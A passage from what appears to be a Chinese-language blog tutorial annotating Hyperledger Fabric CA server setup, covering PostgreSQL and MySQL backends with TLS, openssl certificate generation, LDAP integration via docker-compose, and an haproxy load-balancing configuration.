<li>MySQL:.16 或者之后</li>
</ul>
<h3 id="postgresql"><a href="#postgresql" class="headerlink" title="postgresql"></a>postgresql</h3><p>在server的配置文件中,增加下面的部分,可以连接到postgresql中.确认好要把下面自定义的值合适.关于db名字的有字符的限制.参考这个文件<a href="https://www.postgresql.org/docs/current/static/sql-syntax-lexical.html#SQL-SYNTAX-IDENTIFIERS">https://www.postgresql.org/docs/current/static/sql-syntax-lexical.html#SQL-SYNTAX-IDENTIFIERS</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db:</span><br><span class="line">  type: postgres</span><br><span class="line">  datasource: host&#x3D;localhost port&#x3D;5432 user&#x3D;Username password&#x3D;Password dbname&#x3D;fabric_ca sslmode&#x3D;verify-full</span><br></pre></td></tr></table></figure>
<p>通过sslmode来配置ssl验证的思路.sslmode的有效值是:</p>
<table>
<thead>
<tr>
<th>mode</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>disable</td>
<td>没有ssl</td>
</tr>
<tr>
<td>require</td>
<td>总是ssl(跳过验证)</td>
</tr>
<tr>
<td>verify-ca</td>
<td>总是ssl(验证当前服务器的证书由可信的ca签名)</td>
</tr>
<tr>
<td>verify-full</td>
<td>与verify-ca相同,验证当前的证书由可信的ca签名,并且server的hostname与其中一个证书一致</td>
</tr>
</tbody></table>
<p>如果你想使用tls, 必须在fabric ca server 配置文件中指定db.tls部分.如果ssl在postgresql服务器中enbaled, 那么客户端证书和秘钥文件需要在db.tls.client部分指定,下面是一个db.tls部分的例子:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db:</span><br><span class="line">  ...</span><br><span class="line">  tls:</span><br><span class="line">      enabled: true</span><br><span class="line">      certfiles:</span><br><span class="line">        - db-server-cert.pem</span><br><span class="line">      client:</span><br><span class="line">            certfile: db-client-cert.pem</span><br><span class="line">            keyfile: db-client-key.pem</span><br></pre></td></tr></table></figure>
<p>certfiles: 一系列经过pem编码的可信 的根证书文件<br>certfile和keyfile: 由pem编码的,由fabric ca 的服务器用来和postgresql服务器安全交流的</p>
<h4 id="postgresql的ssl配置"><a href="#postgresql的ssl配置" class="headerlink" title="postgresql的ssl配置"></a>postgresql的ssl配置</h4><h5 id="在postgresql服务器中配置ssl的基本介绍"><a href="#在postgresql服务器中配置ssl的基本介绍" class="headerlink" title="在postgresql服务器中配置ssl的基本介绍"></a>在postgresql服务器中配置ssl的基本介绍</h5><ol>
<li>在postgresql.conf中,取消注释ssl,设置为on(ssl=on)</li>
<li>把证书文件和秘钥文件放到postgresql的数据目录.</li>
</ol>
<p>生成自签名文件的介绍<a href="https://www.postgresql.org/docs/9.5/static/ssl-tcp.html">https://www.postgresql.org/docs/9.5/static/ssl-tcp.html</a></p>
<blockquote>
<p>说明: 自签名的证书只能用来测试, 不能再生产环境中使用.</p>
</blockquote>
<h5 id="PostgreSQL的服务器-需要客户端的证书"><a href="#PostgreSQL的服务器-需要客户端的证书" class="headerlink" title="PostgreSQL的服务器-需要客户端的证书"></a>PostgreSQL的服务器-需要客户端的证书</h5><ol>
<li>把ca的证书放在放在PostgreSQL的数据目录的root.crt文件中</li>
<li>在PostgreSQL.conf中, 设置ssl_ca_file指向客户端的root证书</li>
<li>pg_hba.conf的文件中,把clientcert这个参数设置为1</li>
</ol>
<p>更多细节可以查看postgresql的文档:<a href="https://www.postgresql.org/docs/9.4/static/libpq-ssl.html">https://www.postgresql.org/docs/9.4/static/libpq-ssl.html</a></p>
<h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><p>下面的例子可以加入到fabric ca server的配置文件中,用来连接db.确认好要把下面自定义的值合适.关于db名字的有字符的限制.使用这个文件 <a href="https://dev.mysql.com/doc/refman/5.7/en/identifiers.html">https://dev.mysql.com/doc/refman/5.7/en/identifiers.html</a> 来查看更详细的描述.</p>
<p>在5.7.x中,某些模式决定 ‘0000-00-00’ 是否为一个合法的日期.需要允许这个使用.我们想允许server接收0 值的日期.</p>
<p>在my.cnf中,找到sql_mode,移除NO_ZERO_DATA值.然后重启mysql server</p>
<p>查阅mysql文档选择合适的设置.<a href="https://dev.mysql.com/doc/refman/5.7/en/sql-mode.html">https://dev.mysql.com/doc/refman/5.7/en/sql-mode.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db:</span><br><span class="line">  type: mysql</span><br><span class="line">  datasource: root:rootpw@tcp(localhost:3306)&#x2F;fabric_ca?parseTime&#x3D;true&amp;tls&#x3D;custom</span><br></pre></td></tr></table></figure>
<p>如果需要连接tls,就需要db.tls.client部分,可以在在上面postgresql查看相关的介绍.</p>
<blockquote>
<p>注释:<br>下面是在从配置中遇到一些问题:</p>
<ol>
<li>在docker-compose启动时, 从fabric-ca-server中的报错信息:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Error occurred initializing database: Failed to create user registry for MySQL: Failed to connect to MySQL database: dial tcp 172.18.0.3:3306: getsockopt: connection refused</span><br></pre></td></tr></table></figure>
或者是这样的信息</li>
</ol>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[ERROR] Error occurred initializing database: Failed to create user registry for MySQL: Failed to connect to MySQL database: Error 1045: Access denied for user &#39;root&#39;@&#39;172.18.0.4&#39; (using password: YES)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>或者是</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Error: Error response from server was: Failed to initialize DB: Failed to create user registry <span class="keyword">for</span> MySQL: Failed to create MySQL tables: Error creating certificates table: Error 1067: Invalid default value <span class="keyword">for</span> <span class="string">&#x27;expiry&#x27;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>这些问题主要有两个原因, 一个是fabric ca 服务端连接的参数不对,无法正常连接, 另一个就是MySQL在运行中出现问题,主动断开.<br>对于前者, 主要是这条命令:<code>FABRIC_CA_SERVER_DB_DATASOURCE=root:123456@tcp(mysql_ca:3306)/fabric_ca?parseTime=true</code>这里的这个配置是指用root用户,123456密码连接mysql,而mysql_ca是启动mysql的容器的名字,用这个名字作为hostname,fabric ca服务端就可以解析到myslq的ip地址.(在docker中默认有一个网关,172.18.0.1)</p>
</blockquote>
<blockquote>
<p>对于第二个原因, 在MySQL中有一个模式叫做no-zero-data.这个模式是禁止向mysql中添加日期值为0 的数值. 而fabric-ca 存储的数据到MySQL的时候,创建的certificates表中有一个revoked_at的字段, 存入的数值是0000-00-00 00:00:00.如果没有关闭这么模式, mysql也会断开连接.所以要把no-zero-data模式关闭,才可以正常使用.</p>
</blockquote>
<blockquote>
<p>对于mysql的配置, 也可以参考这里的介绍 <a href="https://dev.mysql.com/doc/refman/5.5/en/docker-mysql-more-topics.html#docker_var_mysql-root-host">https://dev.mysql.com/doc/refman/5.5/en/docker-mysql-more-topics.html#docker_var_mysql-root-host</a> </p>
</blockquote>
<blockquote>
<p>总的来说, 对于mysql可以在两个地方配置.</p>
</blockquote>
<blockquote>
<p>一个是设置docker-compose.yaml文件,在mysql的service中添加如下内容:</p>
</blockquote>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">environment:</span></span><br><span class="line">      <span class="attr">MYSQL_ROOT_PASSWORD:</span> <span class="string">passw0rd</span></span><br><span class="line">      <span class="attr">MYSQL_ALLOW_EMPTY_PASSWORD:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">      <span class="attr">MYSQL_ROOT_HOST:</span> <span class="string">&quot;%&quot;</span></span><br><span class="line"><span class="attr">command:</span> <span class="string">mysqld</span> <span class="string">--sql_mode=&quot;ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION&quot;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>这条命令的意思是, docker-compose在逐个启动各个container(在docker-compose中, 各个container被定义为一个一个的service)的时候,会执行command的这个命令.这个mysqld是指mysql的服务进程.</p>
</blockquote>
<blockquote>
<p>另一个办法是设置mysql的配置文件,这个配置文件就是叫做my.cnf,一般来说路径是/etc/mysql.下面就是在my.cnf文件的相关的部分.</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">sql-mode&#x3D;&quot;ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>设置了这个配置文件之后, 要把这个在宿主机上的配置文件挂载到container中.可以使用docker-compose中的volumes属性.另外,把mysql的端口映射到宿主机,可以在宿主机登录查看</p>
</blockquote>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;3306:3306&quot;</span></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">      <span class="comment"># 把mysql的数据挂载到宿主机</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">主机目录:/var/lib/mysql</span></span><br><span class="line">      <span class="comment"># 把mysql服务器的配置挂载到宿主机</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">主机目录/my.cnf:/etc/mysql/my.cnf</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>顺便可以把mysql的整个数据目录一起映射的宿主机.省得单独导出了.</p>
</blockquote>
<blockquote>
<p>在mysql连接成功之后, 如何验证?只需要连接到docker中的mysql,就可以查看到.正常情况, fabric ca 服务端会在mysql中创建一个fabric-ca的数据库,这个数据库包含三张表,分别是 affiliations,certificates(用于记录已经颁发的证书),和users(用户记录已经认证的用户).</p>
</blockquote>
<blockquote>
<p>连接成功后在workdbench中可以看到如下的:</p>
</blockquote>
<blockquote>
<p><img src="./fabric-ca-tables.png"></p>
</blockquote>
<blockquote>
<p><img src="fabric-ca-tables-users.png"></p>
</blockquote>
<blockquote>
<p><img src="./fabric-ca-table-certicates.png"></p>
</blockquote>
<blockquote>
<p>在配置ldap之后,users表的功能就被ldap替代,所以users表空闲.</p>
</blockquote>
<h4 id="mysql的ssl设置"><a href="#mysql的ssl设置" class="headerlink" title="mysql的ssl设置."></a>mysql的ssl设置.</h4><p>基本介绍</p>
<ol>
<li>打开或者新建一个my.cnf在server中.在mysqld下面,增加或者解除注释.这应该指向了server的key或者证书,和根root证书.<br>创建客户端和服务端的证书的介绍:<a href="http://dev.mysql.com/doc/refman/5.7/en/creating-ssl-files-using-openssl.html">http://dev.mysql.com/doc/refman/5.7/en/creating-ssl-files-using-openssl.html</a></li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[mysqld] </span><br><span class="line">ssl-ca&#x3D;ca-cert.pem </span><br><span class="line">ssl-cert&#x3D;server-cert.pem </span><br><span class="line">ssl-key&#x3D;server-key.pem</span><br></pre></td></tr></table></figure>

<p>运行下面的命令来确认已经启用了ssl连接:<br>mysql&gt; SHOW GLOBAL VARIABLES LIKE ‘have_%ssl’;</p>
<ol start="2">
<li>等服务端的ssl配置完成, 下一步是创建一个使用用户,可是使用ssl连接的特权.为此,登录进入mysql服务器,输入:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; GRANT ALL PRIVILEGES ON . TO ‘ssluser’@’%’ IDENTIFIED BY ‘password’ REQUIRE SSL; mysql&gt; FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>
如果你特定ip可以访问, 把%改成你的ip</li>
</ol>
<h4 id="mysql-服务端-需要客户端证书"><a href="#mysql-服务端-需要客户端证书" class="headerlink" title="mysql 服务端-需要客户端证书"></a>mysql 服务端-需要客户端证书</h4><p>安全连接的配置和其他服务端的配置类似.</p>
<ul>
<li>ssl-ca: 指明用户授权的证书.如果使用这个选项, 必须在fabric-ca服务端使用相同的证书.</li>
<li>ssl-cert: 指明mysql端的证书</li>
<li>ssl-key: 指明mysql服务端的私钥</li>
</ul>
<p>假设说,你想用一个没有加密的账户连接,或者说使用包含REQUIRE SSL选项的GRANT语句创建该帐户.作为推荐的安全连接选项,至少开启ssl-cert和ssl-key选项.然后设置db.tls.certfiles选项,再开启fabric ca 服务器.</p>
<p>要指定客户端证书, 使用REQUIRE X509 创建证书.然后客户端必须指定合适的client key和证书文件,否则, mysql会拒绝连接.为了指定client key和证书文件, 必须db.tls.client.certfile, and db.tls.client.keyfile</p>
<blockquote>
<p>下面是配置ssl中遇到问题: </p>
</blockquote>
<blockquote>
<p>首先是要对ssl连接要一定的了解.一下几个概念需要了解一下:</p>
</blockquote>
<blockquote>
<p>签名: 服务端用自己的私钥对内容的摘要加密, 把加密后的密文和原文发送客户端, 这就是签名.客户端收到之后, 可以用服务端的公钥对密文进行解密,解密之后的内容与收到的原文做摘要之后做比较, 如果相同,说明可以这个内容确实来自服务端(抗抵赖),而且,收到的内容也是完整的(完整性)</p>
</blockquote>
<blockquote>
<p>证书: 为了防止中间人攻击,确保客户端拿到的公钥确实是服务端的,需要对公钥做一些措施.所以,找了一个中间机构(发证机构),服务端把自己的公钥,自己机构的一些消息(就是上面的csr部分)和钱(自签名就交给自己吧orz), 交给发证机构.发证机构用自己的私钥对所有的这些信息进行加密(类似于签名的过程),把加密后的内容和服务器机构信息等放在一起,这就是一个证书.</p>
</blockquote>
<blockquote>
<p>ssl的简单过程:服务端把自己的证书发给客户端,客户端本地要实现安装了发证机构的证书,所以取得发证机构的公钥,解密证书,验证证书有效,这样客户端就获得了服务端的公钥.然后服务端发送一份带有签名的信息(交换对称加密的秘钥在这个过程),这样客户端就可以确定对方是服务端.至此,客户端和服务端就可以愉快的使用对称加密了.</p>
</blockquote>
<blockquote>
<p>更详细的描述可以查看这篇博客:<a href="http://www.cnblogs.com/JeffreySun/archive/2010/06/24/1627247.html">http://www.cnblogs.com/JeffreySun/archive/2010/06/24/1627247.html</a></p>
</blockquote>
<blockquote>
<p>可以参考这篇文章 <a href="https://segmentfault.com/a/1190000007819751">https://segmentfault.com/a/1190000007819751</a> ,使用openssl工具生成一套ssl所需要的配置文件</p>
</blockquote>
<blockquote>
<p>需要注意的是在生成的时候要指定服务器的名字,也就是cn这个字段.<br>具体可以参考如下的设置.</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 需要使用openssl工具</span></span><br><span class="line"><span class="comment"># 配置ssl连接的证书</span></span><br><span class="line"><span class="comment">#-subj /CN=mysql_ca 这个参数用来指定common name, 要与mysql container的name相同.</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ]; <span class="keyword">then</span> </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&#x27;$1 is null &#x27;</span></span><br><span class="line">        commonName=<span class="string">&quot;mysql_ca&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">openssl genrsa 2048 &gt; ca-key.pem <span class="comment">#生成私钥</span></span><br><span class="line">openssl req -new -x509 -nodes -days 3600 \</span><br><span class="line">        -key ca-key.pem  -out ca.pem <span class="comment"># 在执行这条会要求输入csr消息,可以直接回车</span></span><br><span class="line">openssl req -newkey rsa:2048 -days 3600 \</span><br><span class="line">        -nodes -keyout server-key.pem -subj /CN=<span class="variable">$commonName</span> -out server-req.pem</span><br><span class="line">openssl rsa -<span class="keyword">in</span> server-key.pem -out server-key.pem</span><br><span class="line">openssl x509 -req -<span class="keyword">in</span> server-req.pem -days 3600 \</span><br><span class="line">        -CA ca.pem -CAkey ca-key.pem -set_serial 01 -out server-cert.pem</span><br><span class="line">openssl req -newkey rsa:2048 -days 3600 \</span><br><span class="line">        -nodes -keyout client-key.pem -subj /CN=<span class="variable">$commonName</span> -out client-req.pem</span><br><span class="line">openssl rsa -<span class="keyword">in</span> client-key.pem -out client-key.pem</span><br><span class="line">openssl x509 -req -<span class="keyword">in</span> client-req.pem -days 3600 \</span><br><span class="line">        -CA ca.pem -CAkey ca-key.pem -set_serial 01 -out client-cert.pem</span><br><span class="line">openssl verify -CAfile ca.pem server-cert.pem client-cert.pem</span><br><span class="line">openssl x509 -text -<span class="keyword">in</span> ca.pem</span><br></pre></td></tr></table></figure>

<blockquote>
<p>上面的代码一共会生成8个文件:</p>
</blockquote>
<ul>
<li>ca.pem: CA 证书, 用于生成服务器端/客户端的数字证书.</li>
<li>ca-key.pem: CA 私钥, 用于生成服务器端/客户端的数字证书.</li>
<li>server-key.pem: 服务器端的 RSA 私钥</li>
<li>server-req.pem: 服务器端的证书请求文件, 用于生成服务器端的数字证书.</li>
<li>server-cert.pem: 服务器端的数字证书.</li>
<li>client-key.pem: 客户端的 RSA 私钥</li>
<li>client-req.pem: 客户端的证书请求文件, 用于生成客户端的数字证书.</li>
<li>client-cert.pem: 客户端的数字证书.</li>
</ul>
<blockquote>
<p>使用<code>openssl x509 -text -in [证书名字].pem</code>可以查看一个证书的内容:<br><img src="cert-sample.png"></p>
</blockquote>
<blockquote>
<p>在mysql端需要my.cnf中如下配置</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">general_log &#x3D; 1</span><br><span class="line">ssl-ca&#x3D;&#x2F;etc&#x2F;mysql&#x2F;fabric_ca_ssl&#x2F;ca.pem </span><br><span class="line">ssl-cert&#x3D;&#x2F;etc&#x2F;mysql&#x2F;fabric_ca_ssl&#x2F;server-cert.pem </span><br><span class="line">ssl-key&#x3D;&#x2F;etc&#x2F;mysql&#x2F;fabric_ca_ssl&#x2F;server-key.pem</span><br></pre></td></tr></table></figure>
<blockquote>
<p>此处<code>general_log = 1</code>值mysql日志的级别,通过这种方式可以查看是否使用ssl连接</p>
</blockquote>
<blockquote>
<p>把上面生成的ssl文件拷贝到相应的目录中,通过volumns挂在到mysql的容器中.可以参考下面的配置:</p>
</blockquote>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">./mysql2/fabric_ca_ssl:/etc/mysql/fabric_ca_ssl</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>对于fabric-ca端的配置,在环境变量中配置ssl的文件</p>
</blockquote>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="string">FABRIC_CA_SERVER_DB_DATASOURCE=root:passw0rd@tcp(mysql_ca:3306)/fabric_ca?parseTime=true&amp;tls=custom</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">FABRIC_CA_SERVER_DB_TLS_ENABLED=true</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">FABRIC_CA_SERVER_DB_TLS_CERTFILES=/etc/hyperledger/fabric-ca-server-mysql-config/ca.pem</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">FABRIC_CA_SERVER_DB_TLS_CLIENT_CERTFILE=/etc/hyperledger/fabric-ca-server-mysql-config/client-cert.pem</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">FABRIC_CA_SERVER_DB_TLS_CLIENT_KEYFILE=/etc/hyperledger/fabric-ca-server-mysql-config/client-key.pem</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>需要注意的是必须加上<code>tls=custom</code>这一句,这是指定使用tls连接,<code>FABRIC_CA_SERVER_DB_TLS_CERTFILES</code>是指定发证机构的证书,<code>FABRIC_CA_SERVER_DB_TLS_CLIENT_CERTFILE</code>是指定客户端的证书,<code>FABRIC_CA_SERVER_DB_TLS_CLIENT_KEYFILE</code>是指定客户端的私钥</p>
</blockquote>
<blockquote>
<p>同样要记得把相应的文件导入到fabric-ca的容器中,可以参考如下的配置:</p>
</blockquote>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./mysql2/fabric_ca_ssl:/etc/hyperledger/fabric-ca-server-mysql-config</span></span><br></pre></td></tr></table></figure>

<p><img src="./mysql-log.png"></p>
<blockquote>
<p>上图显示的172.18.0.2是fabric-ca分配的ip,下面的172.18.0.1是在宿主机中用workbench连接是,通过docker网关(172.18.0.1)进行连接.</p>
</blockquote>
<blockquote>
<p>可以使用如下命令查看某个容器的ip:</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker inspect [容器名字] | grep IPAddress</span><br></pre></td></tr></table></figure>


<h2 id="配置ldap"><a href="#配置ldap" class="headerlink" title="配置ldap"></a>配置ldap</h2><p>fabric ca服务端也可以配置为从ldap服务器读取.</p>
<p>特别是,fabric ca连接到ldap后做以下的事情:</p>
<ul>
<li>在注册之前验证身份</li>
<li>检索用于授权的身份的属性值</li>
</ul>
<p>修改Fabric CA服务器配置文件的LDAP部分，将服务器配置为连接到LDAP服务器。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldap:</span><br><span class="line">   # Enables or disables the LDAP client (default: false)</span><br><span class="line">   enabled: false</span><br><span class="line">   # The URL of the LDAP server</span><br><span class="line">   url: &lt;scheme&gt;:&#x2F;&#x2F;&lt;adminDN&gt;:&lt;adminPassword&gt;@&lt;host&gt;:&lt;port&gt;&#x2F;&lt;base&gt;</span><br><span class="line">   userfilter: filter</span><br></pre></td></tr></table></figure>

<p>此处参数的含义:</p>
<ul>
<li>where: 其中一个ldap</li>
<li>adminDN: admin用户的独有的名字</li>
<li>pass: admin用户的密码</li>
<li>host:ldap服务器的hostname或者ip</li>
<li>port: 可选的,ldap默认389, ldaps默认636</li>
<li>base:用于搜索的LDAP树的可选根目录;</li>
<li>filter: 在搜索时, 把登录名字转换为一个独特的名字.例如: 一个uid=%的值是搜索的值是一个在登录时有uid属性的值.email=%s可能用来使用email地址登录.</li>
</ul>
<p>以下是一个openldap服务器的默认设置, docker镜像在<br><a href="https://github.com/osixia/docker-openldap">https://github.com/osixia/docker-openldap</a>.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldap:</span><br><span class="line">   enabled: true</span><br><span class="line">   url: ldap:&#x2F;&#x2F;cn&#x3D;admin,dc&#x3D;example,dc&#x3D;org:admin@localhost:10389&#x2F;dc&#x3D;example,dc&#x3D;org</span><br><span class="line">   userfilter: (uid&#x3D;%s)</span><br></pre></td></tr></table></figure>
<p>查看<code>FABRIC_CA/scripts/run-ldap-tests</code>这个脚本来开启openldap的docker镜像,配置, 运行,使用这个<code>FABRIC_CA/cli/server/ldap/ldap_test.go</code>测试, 并且停止openldap服务器.</p>
<p>当一个ldap配置后, enrollment的工作流是这样的:</p>
<ul>
<li>fabric ca client或者client 登录请求,在头部带有一个授权信息(就是enroll的时候用户名和密码).</li>
<li>fabric ca server 收到enroment请求,解码授权头部中的实体的名字,密码.使用’userfilter’查找与这个实体名字相关的distinguished name. 尝试使用这个密码进行ldap绑定.如果ldap绑定成功,那么, enrollment过程就被授权,和继续执行.</li>
</ul>
<p>当ldap配置后, 获取属性的工作流是这样的:</p>
<ul>
<li>一个客户端的sdk向fabric ca服务端发送一个请求来获取一些有一个或者多个属性的证书.</li>
<li>当fabric ca 服务端收到tcert的请求后的工作流:<ul>
<li>根据在授权头部中的token来提取enrollment id.(在验证了token之后)</li>
<li>向ldap服务器做一个ldap搜索和查询, 请求所有在tcert请求中的属性名.</li>
<li>属性值就会被放在tcert中.</li>
</ul>
</li>
</ul>
<blockquote>
<p>注释: 主要是两个地方的配置,一个是ca中开启ldap,</p>
</blockquote>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="string">FABRIC_CA_SERVER_LDAP_ENABLED=true</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">FABRIC_CA_SERVER_LDAP_URL=ldap://cn=admin,dc=example,dc=org:adminpw@fabric_ca_openldap:389/dc=example,dc=org</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">FABRIC_CA_SERVER_LDAP_URL_USERFILTER=(uid=%s)</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>fabric-ca服务端已经实现了ldap的客户端, 另一个添加ldap服务到docker-compose中.为了方便查看,还可以安装ldapPhpAdmin来查看和管理ldap中的用户.</p>
</blockquote>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">ldap:</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">osixia/openldap:1.2.1</span></span><br><span class="line">      <span class="attr">container_name:</span> <span class="string">fabric_ca_openldap</span></span><br><span class="line">      <span class="attr">environment:</span></span><br><span class="line">        <span class="attr">LDAP_LOG_LEVEL:</span> <span class="string">&quot;-1&quot;</span> <span class="comment"># 	enable all debugging</span></span><br><span class="line">        <span class="attr">LDAP_ADMIN_PASSWORD:</span> <span class="string">&quot;adminpw&quot;</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">        <span class="comment"># 数据文件</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">./openldap/ldap:/var/lib/ldap</span></span><br><span class="line">        <span class="comment"># 配置文件</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">./openldap/slapd.d:/etc/ldap/slapd.d</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">./openldap_data/add-user.ldif:/tmp/add-user.ldif</span></span><br><span class="line">      <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">&quot;389:389&quot;</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">&quot;636:636&quot;</span></span><br><span class="line">      <span class="attr">networks:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">basic</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">phpLDAPadmin:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">osixia/phpldapadmin:0.7.1</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">fabric_phpLDAPadmin</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8080:80&quot;</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">PHPLDAPADMIN_LDAP_HOSTS=fabric_ca_openldap</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">PHPLDAPADMIN_HTTPS=&quot;false&quot;</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ldap</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">basic</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里的<code>add-user.ldif</code>相当于mysql中的sql文件,可以执行这个命令向ldap中添加用户.</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> fabric_ca_openldap ldapadd -cxD cn=admin,dc=example,dc=org -w adminpw -f /tmp/add-user.ldif</span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> fabric_ca_openldap ldappasswd -xD cn=admin,dc=example,dc=org -w adminpw uid=jsmith,dc=example,dc=org -s jsmithpw</span><br></pre></td></tr></table></figure>
<blockquote>
<p>可以到浏览器访问<code>localhost:8080</code>,使用<code>cn=admin,dc=example,dc=org,adminpw</code>这个管理员的用户密码登录,就可以发现刚刚添加的用户.<br><img src="ldap-jsmith.png"></p>
</blockquote>
<blockquote>
<p>使用ldap之后, fabric-ca服务端的执行start的时候就不用-b选项了.</p>
</blockquote>
<blockquote>
<p>可以在fabric-ca服务端登录这个用户,可以看到jsmith这个用户已经拿到证书:<br><img src="jsmith-enroll.png"><br><img src="jsmith-cert.png"></p>
</blockquote>
<h2 id="配置集群"><a href="#配置集群" class="headerlink" title="配置集群"></a>配置集群</h2><p>你可能会用ip sprayer来对一个ca集群做负载均衡.本部分提供一个例子, 如何设置haproxy作为一个ca服务集群的路由.确定把hostname和端口设置到与ca服务器相符.</p>
<p>haproxy.conf的配置:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">global</span><br><span class="line">      maxconn 4096</span><br><span class="line">      daemon</span><br><span class="line"></span><br><span class="line">defaults</span><br><span class="line">      mode http</span><br><span class="line">      maxconn 2000</span><br><span class="line">      timeout connect 5000</span><br><span class="line">      timeout client 50000</span><br><span class="line">      timeout server 50000</span><br><span class="line"></span><br><span class="line">listen http-in</span><br><span class="line">      bind *:7054</span><br><span class="line">      balance roundrobin</span><br><span class="line">      server server1 hostname1:port</span><br><span class="line">      server server2 hostname2:port</span><br><span class="line">      server server3 hostname3:port</span><br></pre></td></tr></table></figure>
<p>注意, 如果使用tls, 要使用tcp模式.</p>
<blockquote>
<p>说明:<br>要完成这个需要启动一个haproxy服务</p>
</blockquote>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">haproxy_ca:</span></span><br><span class="line">  <span class="attr">image:</span> <span class="string">haproxy</span></span><br><span class="line">  <span class="attr">container_name:</span> <span class="string">haproxy_ca</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;70:70&quot;</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">./haproxy/haproxy.cfg:/usr/local/etc/haproxy/haproxy.cfg</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">./haproxy/log:/dev/log</span></span><br><span class="line">  <span class="attr">networks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">basic</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>而对于haproxy, 要做这样的配置:</p>
</blockquote>
